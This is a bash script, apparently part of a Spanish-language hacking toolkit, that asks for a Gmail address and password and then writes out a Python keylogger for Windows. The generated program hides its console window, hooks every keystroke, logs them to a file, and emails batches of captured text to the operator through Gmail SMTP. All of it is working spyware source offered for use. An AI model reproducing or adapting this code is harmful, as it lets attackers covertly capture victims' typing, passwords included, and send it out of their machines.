bash .banner
echo "Introduce tu gmail:"
read input
bash .banner
echo "Introduce tu contraseña:"
read input1
bash .banner
echo ""
echo "#!/usr/bin/env python" > key.py
echo "# -*- coding: utf-8 -*-" >> key.py
echo "" >> key.py
echo "import win32console" >> key.py
echo "import win32gui" >> key.py
echo "import pythoncom,pyHook" >> key.py
echo "import time" >> key.py
echo "import smtplib" >> key.py
echo "import os" >> key.py
echo "import sys" >> key.py
echo "" >> key.py
echo "# Creado por NePtYx" >> key.py
echo "########################################################" >> key.py
echo "# CONFIGURAR VARIABLES" >> key.py
echo "########################################################" >> key.py
echo "" >> key.py
echo "win = win32console.GetConsoleWindow()" >> key.py
echo "win32gui.ShowWindow(win,0)" >> key.py
echo "" >> key.py
echo "#crea el archivo .txt" >> key.py
echo 'f=open("c:\output.txt","w+")' >> key.py
echo "f.close" >> key.py
echo "" >> key.py
echo "#Variable que cuenta las tecas presionadas" >> key.py
echo "count = 0" >> key.py
echo "" >> key.py
echo "########################################################" >> key.py
echo "# FUNCIONES" >> key.py
echo "########################################################" >> key.py
echo ""
echo "def send_email(message):" >> key.py
echo ""
echo "    try:" >> key.py
echo ""
echo "        # Datos" >> key.py
echo "        fromaddr = '$input'" >> key.py
echo "        toaddrs = '$input'" >> key.py
echo "        username = '$input'" >> key.py
echo "        password = '$input1'" >> key.py
echo ""
echo "        # Enviando el correo" >> key.py
echo "        server = smtplib.SMTP('smtp.gmail.com:587')" >> key.py
echo "        server.starttls()" >> key.py
echo "        server.login(username,password)" >> key.py
echo "        server.sendmail(fromaddr, toaddrs, message)" >> key.py
echo "        server.quit()" >> key.py
echo "" >> key.py
echo "    except:" >> key.py
echo "" >> key.py
echo "        pass" >> key.py
echo ""
echo "" >> key.py
echo "def OnKeyboardEvent(event):" >> key.py
echo "" >> key.py
echo "    global count" >> key.py
echo "    count += 1" >> key.py
echo "    #presiona CTRL+E para salir" >> key.py
echo "    if event.Ascii==5:" >> key.py
echo "        sys.exit(0)" >> key.py
echo "" >> key.py
echo "    if event.Ascii !=0 or 8:" >> key.py
echo "        #abre output.txt" >> key.py
echo "        f=open('c:\output.txt','r+')" >> key.py
echo "        buffer=f.read()" >> key.py
echo "        f.close()" >> key.py
echo "" >> key.py
echo "        if len(buffer)==1:" >> key.py
echo '            send_email("Arranco...")' >> key.py
echo "" >> key.py
echo "        elif  count == 500:" >> key.py
echo "            #Envia los ultimos 500 caracteres" >> key.py
echo '            capturado = buffer[-500:].replace("\n","")' >> key.py
echo "            send_email(capturado)" >> key.py
echo "            count = 0" >> key.py
echo "" >> key.py
echo "        #abre output.txt escribe y suma nuevas pulsaciones" >> key.py
echo "        f=open('c:\output.txt','w')" >> key.py
echo "        keylogs=chr(event.Ascii)" >> key.py
echo "" >> key.py
echo "        #si se presiona ENTER" >> key.py
echo "        if event.Ascii==13:" >> key.py
echo "            keylogs='\n'" >> key.py
echo "" >> key.py
echo "        #si se preciona ESPACIO" >> key.py
echo "        if event.Ascii==32:" >> key.py
echo "            keylogs=''" >> key.py
echo "" >> key.py
echo "        buffer+=keylogs" >> key.py
echo "        f.write(buffer)" >> key.py
echo "        f.close()" >> key.py
echo "" >> key.py
echo "" >> key.py
echo "# crea el objeto hook manager" >> key.py
echo "hm = pyHook.HookManager()" >> key.py
echo "hm.KeyDown = OnKeyboardEvent" >> key.py
echo "# set the hook" >> key.py
echo "hm.HookKeyboard()" >> key.py
echo "# wait forever" >> key.py
echo "pythoncom.PumpMessages()" >> key.py
echo "####################################" >> key.py
mkdir $HOME/MgToLs/KeyLoggers
mv key.py $HOME/MgToLs/KeyLoggers/
bash .banner
echo "Keylogger creado guardado en $HOME/MgToLs/KeyLoggers/key.py"
echo ""
echo "Presiona una tecla para continuar..."
read pause
